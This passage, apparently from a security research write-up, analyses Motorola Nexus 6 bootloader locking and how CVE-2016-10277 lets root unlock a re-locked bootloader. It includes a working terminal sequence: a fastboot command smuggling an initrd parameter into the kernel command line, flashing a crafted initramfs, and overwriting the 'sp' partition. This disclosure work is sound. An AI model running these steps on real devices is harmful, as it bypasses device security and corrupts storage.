Although it's possible for Nexus 6 to load with a tampered boot and recovery images, they are expected to run a TZ state less capable than of ABOOT => code running in ABOOT can be more capable than code running in the platform OS => having ABOOT unlocked (which may increase its capabilities, allow more commands, etc) may elevate the privileges of the adversary, comparing with what he can achieve by having full control over boot/recovery/system..."

Back in 2013, Dan Rosenberg found a vulnerability in the Motorola TrustZone kernel, allowing him to unlock the Motorola bootloader. [In his blog](http://blog.azimuthsecurity.com/2013/04/unlocking-motorola-bootloader.html), Dan depicted how Motorola implemented bootloader locking (also relevant for `shamu`), which can be summarized as the following state machine:
 ```
 .---------.
 | Factory |       .----------.
 | Locked  | --->  | Unlocked |  <---.  (3)
 `---------' (1)   `-----.----'      |      
                         |      .-----------.
                         `----> | Re-locked |
                           (2)  `-----------'
 ```
 The transitions are as follows:
 
1. The user first unlocks the device. The `WARRANTYVOID` qfuse is blown. This transition is governed by TEE thus it cannot be done from the Platform OS. 
2. User re-locks the device. Bootloader writes an entry under the `sp` partition, with an HMAC produced by TEE.
3. User unlocks the device. Bootloader removes that entry.
 
 *Conclusion:* An unrestricted root (as one could gain by exploiting @CVE-2016-10277) can unlock a re-locked bootloader by invalidating the `sp` partition.
 
 ```terminal
 $ fastboot getvar all
 ...
 (bootloader) secure: yes
 (bootloader) unlocked: no
 (bootloader) securestate: locked
 (bootloader) iswarrantyvoid: yes
 (bootloader) mot_sst: 2
 
 $ fastboot oem config fsg-id "a initrd=0x11000000,1519997"
 $ fastboot flash foo initroot.cpio.gz
 $ fastboot continue
 
 $ adb shell
 shamu:/ # echo 0 > /dev/block/platform/msm_sdcc.1/by-name/sp
 shamu:/ # reboot bootloader
 
 $ fastboot getvar all
 ...
 (bootloader) unlocked: yes
 (bootloader) securestate: unlocked
 (bootloader) iswarrantyvoid: yes
 (bootloader) mot_sst: 3
 ```
